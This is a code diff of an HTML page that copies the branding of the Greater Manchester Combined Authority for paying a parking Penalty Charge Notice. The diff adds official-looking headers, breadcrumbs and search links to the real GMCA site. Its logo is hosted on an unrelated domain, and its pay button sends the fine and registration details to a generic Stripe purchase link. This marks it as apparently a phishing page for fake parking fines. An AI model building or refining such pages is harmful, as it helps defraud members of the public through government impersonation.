@@ -9,23 +9,41 @@
   <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/govuk-frontend@4.13.0/dist/govuk-frontend-4.13.0.min.css">
 
   <!-- Custom styles -->
-  <link rel="stylesheet" href="style.css">
+  <link rel="stylesheet" href="../start/style.css">
 </head>
 
 <body>
   <!-- Header -->
   <header class="gmca-header">
     <div class="gmca-header__container">
-      <img src="icon.svg" alt="GMCA logo" class="gmca-logo">
+      <a href="https://www.greatermanchester-ca.gov.uk/" target="_blank" rel="noopener">
+        <img src="https://eryripress.co.uk/icon3.svg" alt="GMCA logo" class="gmca-logo">
+      </a>
     </div>
   </header>
 
-  <main class="govuk-width-container" id="main-content">
+  <!-- Search bar -->
+  <div class="gmca-search-bar">
+    <div class="gmca-search-container">
+      <form id="gmca-search-form">
+        <input id="gmca-search-input" type="text" placeholder="Search Greater Manchester Combined Authority...">
+        <button type="submit">Search</button>
+      </form>
+    </div>
+  </div>
+
+  <!-- Breadcrumb -->
+  <nav class="gmca-breadcrumb">
+    <a href="https://www.greatermanchester-ca.gov.uk/">Home</a> ›
+    <a href="/portal">Parking Fines</a> ›
+    <span>Pay a Fine</span>
+  </nav>
+
+  <!-- Main content -->
+  <main class="gmca-main">
     <div class="lookup-card">
+      <h2 class="page-title">Confirm Penalty Charge Notice</h2>
 
-      <h1 class="page-title">Confirm Penalty Charge Notice</h1>
-
-      <!-- PCN details boxes -->
       <div class="info-box">
         <p><strong>PCN Number:</strong> <span id="pcn-value">Loading...</span></p>
       </div>
@@ -42,17 +60,34 @@
         Reduced by 50% as the charge will be paid within 14 days of the issue date.
       </p>
 
-      <button id="pay-button" class="search-button">Proceed to payment</button>
+      <button id="pay-button" class="gmca-button teal">Proceed to Payment</button>
 
       <div class="bottom-text">
         <p><a href="/portal" class="govuk-link">Go back</a></p>
       </div>
-
     </div>
   </main>
 
+  <!-- Footer -->
+  <footer class="gmca-footer">
+    <p>© Greater Manchester Combined Authority 2025</p>
+  </footer>
+
   <script>
+    // Search bar behaviour
     document.addEventListener("DOMContentLoaded", function () {
+      const searchForm = document.getElementById("gmca-search-form");
+      const searchInput = document.getElementById("gmca-search-input");
+
+      searchForm.addEventListener("submit", function (e) {
+        e.preventDefault();
+        const query = encodeURIComponent(searchInput.value.trim());
+        if (query) {
+          window.location.href = `https://www.greatermanchester-ca.gov.uk/search?Query=${query}`;
+        }
+      });
+
+      // PCN details
       const params = new URLSearchParams(window.location.search);
       const pcn = params.get("pcn");
       const vrm = params.get("vrm");
@@ -70,10 +105,10 @@
         payBtn.disabled = true;
       }
 
-      // Redirect to Stripe (update link later)
+      // Redirect to Stripe (or your processor)
       payBtn.addEventListener("click", function () {
         const stripeUrl = "https://buy.stripe.com/5kQ6oJefgdMifphh1g1RC00";
-        window.location.href = stripeUrl + `?pcn=${encodeURIComponent(pcn)}&vrm=${encodeURIComponent(vrm)}`;
+        window.location.href = `${stripeUrl}?pcn=${encodeURIComponent(pcn)}&vrm=${encodeURIComponent(vrm)}`;
       });
     });
   </script>
